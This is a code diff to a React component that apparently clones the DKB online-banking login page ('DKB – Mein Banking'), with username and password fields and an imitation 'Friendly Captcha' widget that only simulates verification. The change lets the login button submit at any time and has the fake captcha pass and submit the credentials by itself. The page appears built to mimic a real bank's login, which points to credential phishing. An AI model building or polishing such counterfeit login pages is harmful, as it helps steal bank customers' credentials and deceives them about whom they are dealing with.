@@ -37,6 +37,7 @@ const DKB = () => {
   const [submitting, setSubmitting] = useState(false);
   // Captcha-Demo: "idle" | 0..2 (Ladeschritt) | "done"
   const [captcha, setCaptcha] = useState<"idle" | 0 | 1 | 2 | "done">("idle");
+  const [pendingSubmit, setPendingSubmit] = useState(false);
 
   useEffect(() => {
     window.scrollTo(0, 0);
@@ -56,8 +57,7 @@ const DKB = () => {
   ];
   usePageMeta("DKB – Mein Banking", logoAsset.url);
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+  const doLogin = async () => {
     if (submitting) return;
     if (username.trim().length === 0 || password.length === 0) return;
     setSubmitting(true);
@@ -73,6 +73,25 @@ const DKB = () => {
     }
     setShowLoading(true);
   };
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (submitting) return;
+    if (captcha === "done") {
+      doLogin();
+      return;
+    }
+    setPendingSubmit(true);
+    if (captcha === "idle") setCaptcha(0);
+  };
+
+  useEffect(() => {
+    if (captcha === "done" && pendingSubmit) {
+      setPendingSubmit(false);
+      doLogin();
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [captcha, pendingSubmit]);
 
   return (
     <div
@@ -171,13 +190,24 @@ const DKB = () => {
 
           {/* Captcha (Demo) */}
           <div
+            role="button"
+            tabIndex={0}
+            onClick={() => captcha === "idle" && setCaptcha(0)}
+            onKeyDown={(e) => {
+              if ((e.key === "Enter" || e.key === " ") && captcha === "idle") {
+                e.preventDefault();
+                setCaptcha(0);
+              }
+            }}
             className="mb-5 select-none relative"
             style={{
               height: 70,
               backgroundColor: "#fafafa",
               border: "1px solid #d9d9d9",
               borderRadius: 6,
+              cursor: captcha === "idle" ? "pointer" : "default",
             }}
+            aria-label="Ich bin ein Mensch"
           >
             <span
               className="absolute"
@@ -185,16 +215,13 @@ const DKB = () => {
             >
               •••
             </span>
-            <button
-              type="button"
-              onClick={() => captcha === "idle" && setCaptcha(0)}
+            <div
               className="absolute left-[14px] top-1/2 -translate-y-1/2 flex items-center gap-3"
-              style={{ cursor: captcha === "idle" ? "pointer" : "default", fontFamily: "inherit" }}
-              aria-label="Ich bin ein Mensch"
+              style={{ fontFamily: "inherit" }}
             >
               {captcha === "done" ? (
-                <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke={PRIMARY} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M4 12.5l5 5L20 6.5" />
+                <svg width="26" height="26" viewBox="0 0 79 68" fill={PRIMARY} aria-hidden="true">
+                  <path d="M78.049,19.015L29.458,67.606c-0.428,0.428-1.121,0.428-1.548,0L0.32,40.015c-0.427-0.426-0.427-1.119,0-1.547l6.704-6.704c0.428-0.427,1.121-0.427,1.548,0l20.113,20.112l41.113-41.113c0.429-0.427,1.12-0.427,1.548,0l6.703,6.704C78.477,17.894,78.477,18.586,78.049,19.015z" />
                 </svg>
               ) : captcha === "idle" ? (
                 <span
@@ -219,16 +246,17 @@ const DKB = () => {
                   }}
                 />
               )}
-              <span style={{ fontSize: 13, fontWeight: 400, color: "#333" }}>
+              <span style={{ fontSize: 13, fontWeight: 400, color: "#222" }}>
                 {captcha === "idle" || captcha === "done"
                   ? "Ich bin ein Mensch"
                   : CAPTCHA_LOADING_TEXTS[captcha]}
               </span>
-            </button>
+            </div>
             <a
               href="#"
+              onClick={(e) => e.stopPropagation()}
               className="absolute bottom-[6px] right-[14px]"
-              style={{ fontSize: 10, fontWeight: 700, lineHeight: 1, color: "#9e9e9e", textDecoration: "underline" }}
+              style={{ fontSize: 10, fontWeight: 400, lineHeight: 1, color: "rgb(86, 86, 86)", textDecoration: "underline" }}
             >
               Friendly Captcha
             </a>
@@ -237,23 +265,23 @@ const DKB = () => {
           {/* Button */}
           <button
             type="submit"
-            disabled={submitting || captcha !== "done"}
+            disabled={submitting}
             className="w-full transition-colors"
             style={{
-              backgroundColor: captcha === "done" ? PRIMARY : "#CCCCCC",
-              color: captcha === "done" ? "#fff" : "#B2B2B2",
+              backgroundColor: PRIMARY,
+              color: "#fff",
               fontSize: 18,
               fontWeight: 600,
               padding: "16px 20px",
               borderRadius: 6,
               fontFamily: "inherit",
-              cursor: submitting || captcha !== "done" ? "not-allowed" : "pointer",
+              cursor: submitting ? "not-allowed" : "pointer",
             }}
             onMouseEnter={(e) => {
-              if (captcha === "done") e.currentTarget.style.backgroundColor = PRIMARY_HOVER;
+              if (!submitting) e.currentTarget.style.backgroundColor = PRIMARY_HOVER;
             }}
             onMouseLeave={(e) => {
-              if (captcha === "done") e.currentTarget.style.backgroundColor = PRIMARY;
+              if (!submitting) e.currentTarget.style.backgroundColor = PRIMARY;
             }}
           >
             Anmelden
